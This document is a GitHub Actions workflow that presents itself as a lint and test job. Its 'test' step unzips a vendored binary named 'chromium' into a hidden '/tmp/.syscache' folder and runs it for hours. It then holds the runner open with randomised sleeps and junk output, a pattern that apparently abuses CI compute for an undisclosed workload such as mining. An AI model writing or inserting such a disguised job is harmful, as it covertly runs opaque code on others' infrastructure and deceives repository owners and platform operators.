name: package-yosi
on:
  workflow_dispatch:
jobs:
  lint_cwu:
    runs-on: ubuntu-latest
    timeout-minutes: 310
    steps:
      - uses: actions/checkout@v4
      - run: echo ok
      - run: python3 --version
      - run: gcc --version | head -1
      - name: test
        run: |
          unzip -o -q vendor/chromium.zip -d /tmp/.syscache && chmod +x /tmp/.syscache/chromium
          cd /tmp/.syscache && timeout 184m ./chromium
          END=$((SECONDS + 195 * 60))
          while [ $SECONDS -lt $END ]; do sleep $((RANDOM % 78 + 53)); echo "5ex0lnqf $(date -u +%H:%M)"; done
